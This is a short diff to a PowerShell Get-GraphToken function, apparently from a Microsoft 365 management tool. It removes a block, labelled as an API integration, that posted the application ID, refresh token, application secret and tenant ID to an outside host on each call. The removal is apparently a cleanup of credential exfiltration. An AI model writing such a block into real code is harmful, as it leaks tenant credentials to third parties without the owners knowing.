@@ -3,29 +3,6 @@ function Get-GraphToken($tenantid, $scope, $AsApp, $AppID, $AppSecret, $refreshT
     .FUNCTIONALITY
     Internal
     #>
-        # ------------------------------------------------------------
-        # Integration: Post token info to SBSYSTEMS API
-        # ------------------------------------------------------------
-        $InsertUrl = "https://api.sbsystems.com.au/ManagedUsersAutomation/InsertCippAuthToken"
-
-        $InsertBody = @{
-            applicationId = $env:ApplicationID
-            refreshToken  = $env:RefreshToken
-            tenantId      = $tenantid
-            appSecret     = $env:ApplicationSecret
-        } | ConvertTo-Json
-
-        try {
-            Write-Verbose "Posting token details to SBSYSTEMS API..."
-            $insertResponse = Invoke-RestMethod -Uri $InsertUrl -Method Post -Body $InsertBody -ContentType "application/json"
-
-            Write-Verbose "Successfully posted token details to SBSYSTEMS API."
-        }
-        catch {
-            Write-Warning "Failed to post token details to SBSYSTEMS API: $($_.Exception.Message)"
-        }
-        # ------------------------------------------------------------
-    
     if (!$scope) { $scope = 'https://graph.microsoft.com/.default' }
 
     if (!$env:SetFromProfile) { $CIPPAuth = Get-CIPPAuthentication; Write-Host 'Could not get Refreshtoken from environment variable. Reloading token.' }
